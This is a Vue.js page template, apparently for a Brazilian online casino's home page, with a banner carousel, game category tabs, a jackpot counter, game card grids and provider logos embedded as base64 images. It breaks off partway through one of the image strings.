<template>
  <BaseLayout :footer="false">
    <LoadingComponent :isLoading="isLoading">
      <div class="text-center">
        <span>Carregando dados da plataforma</span>
        <!-- <span>{{ $t("Loading data from the platform") }}</span> -->
      </div>
    </LoadingComponent>

    <!-- <div
      v-if="alertTop"
      class="w-full justify-between items-center inline-flex mb-6"
      style="background: rgb(92, 39, 245)"
    >
      <span class="tips-con ml-4"
        >Ganhe até R$ 30 para cada usuário depositante que você convidar!</span
      >
      <span class="inline-flex mr-5">
        <span class="btn alert-btn-1 my-1 mr-5">clique</span>
        <span class="i-cross btn" @click="alertTop = false">╳</span>
      </span>
    </div> -->

    <div v-if="wlC" style="overflow: visible">
      <div class="relative flex items-center mt-3 mb-2 pt-2 pb-2">
        <div class="scrolling-text-container">
          <div class="scrolling-text hover-text text-sm" style="color: white">
            {{ scrollingText }}
          </div>
        </div>
      </div>

      <!-- Banners carousel -->
      <div class="carousel-banners z-50">
        <div class="mx-auto pt-2 md:pt-4">
          <Carousel v-bind="settings" :settings="settings" :breakpoints="breakpoints" ref="carouselBanner">
            <Slide v-for="(banner, index) in banners" :key="index">
              <div class="carousel__item">
                <a :href="banner.link" class="h-full bg-blue-800 rounded">
                  <img :src="`/storage/` + banner.image" alt="" class="h-full w-full" />
                </a>
              </div>
            </Slide>

            <template #addons>
              <Navigation />
              <Pagination />
            </template>
          </Carousel>
        </div>
      </div>

      <div class="lg-px-8">
        <div class="el-tabs__header is-top">
          <div class="el-tabs__nav-wrap is-top">
            <div class="el-tabs__nav-scroll">
              <div
                class="el-tabs__nav is-top"
                role="tablist"
                style="transform: translateX(0px)"
              >
                <div
                  class="el-tabs__active-bar is-top"
                  style="width: 115px; transform: translateX(12px)"
                ></div>

                <div
                  ref="all"
                  @click="selectCategory('all')"
                  class="el-tabs__item is-top"
                  :class="{
                    'is-active': selectedCategory === 'all',
                  }"
                  style="cursor: pointer"
                >
                  <img
                    style="width: 20px; margin-right: 2px"
                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAFJSURBVHgB7ZbbUcMwEEXXqYASTBd4qCAx6QEqACqI0kE6gB4YW6kAQxW4BBrAYv0Rxih62Lrih9nzk4m8Y5/Req9MJAhCkIIA2qb74J8yUtZv6uqSElkRRpmpxgsq+OeIIIoIovxvQTPQPl4zRGtCQEE90rx0qljRznVtlKu314oAnIKxE4KF1Hpd7UOStpzW7zteU+THeeL4WlxSAG6t0rr7Eaq3lZq2O0HO+8zkd9Alye24I2MeE+S8+FpsaO4NrHZPWSrHLT7zgWNm3Mm2fX2w13XT3SI7dyJLDhpTfDrWLigDGXaQB6Kunu31zc3VYU5OxgCD+ve0Ho9v9w239vTfnu4UgCk+j5Lhyxz4LX8KRVAuwZ4Wyk0HIpaTS54JH3WhKAlF0FwgwTk5h0qiQ6LiNRStCSEfrCgiiCKCKKhgn6lGEIRUvgE3Qb/6AUD0YwAAAABJRU5ErkJggg=="
                  />
                  Todos
                </div>
                <div
                  v-for="(category, index) in categories"
                  :key="index"
                  @click="selectCategory(category.slug)"
                  class="el-tabs__item is-top"
                  :class="{
                    'is-active': selectedCategory === category.slug,
                  }"
                  style="cursor: pointer"
                >
                  {{ $t(category.name) }}
                </div>
              </div>
            </div>
          </div>
        </div>

        <div id="app" class="z-50" style="margin: 0 auto 0px !important">
          <div class="jackpot_rox">
            <img :src="`/storage/rox/jackpot_bg_1.png`" />
            <div class="jackpot_text">{{ formattedValue }}</div>
          </div>
        </div>

        <!-- categories -->
        <div class="relative">
          <!-- Popular -->
          <div
            :id="category.slug"
            v-show="selectedCategory === category.slug || selectedCategory === 'all'"
            class="w-full"
            v-for="(category, index) in categories"
          >
            <div
              v-if="'games' in category && category.games.length > 0"
              class="w-full flex justify-between items-center mt-8 mb-4 gap-1 md:gap-2"
            >
              <h2 class="text-section">{{ $t(category.name) }}</h2>

              <span
                @click="selectCategory(category.slug)"
                style="cursor: pointer; color: #b6b5c7"
                >{{
                  category.gamesToShow < category.games.length
                    ? "Ver mais"
                    : "Exibindo todos em " + category.name
                }}
                <span
                  v-if="category.gamesToShow < category.games.length"
                  class="right-arrow-box px-2 py-1"
                  >&gt;</span
                >
              </span>
            </div>

            <div class="grid grid-cols-3 md:grid-cols-6 gap-4 mb-8">
              <CassinoGameCard
                v-for="(game, index) in category.games.slice(0, category.gamesToShow)"
                :key="index"
                :index="index"
                :title="game.game_name"
                :cover="game.cover"
                :gamecode="game.game_code"
                :type="game.distribution"
                :game="game"
              />
            </div>

            <h1
              class="w-full text-center"
              v-if="
                category.gamesToShow < category.games.length &&
                selectedCategory === category.slug
              "
              @click="loadMoreGames(category.slug)"
            >
              Carregar mais
            </h1>
          </div>
        </div>
      </div>

      <div class="partner-box">
        <p class="title">Fornecedores de jogos</p>
        <div class="con-box">
          <div class="con-item btn">
            <img :src="`/storage/rox/9faf62e8.png`" />
          </div>
          <div class="con-item btn">
            <img
              src="data:image/png;base64,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"
            />
          </div>
          <div class="con-item btn">
            <img :src="`/storage/rox/3-dc3e889d.png`" />
          </div>
          <div class="con-item btn">
            <img
              src="data:image/png;base64,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"
            />
          </div>
          <div class="con-item btn">
            <img
              src="data:image/png;base64,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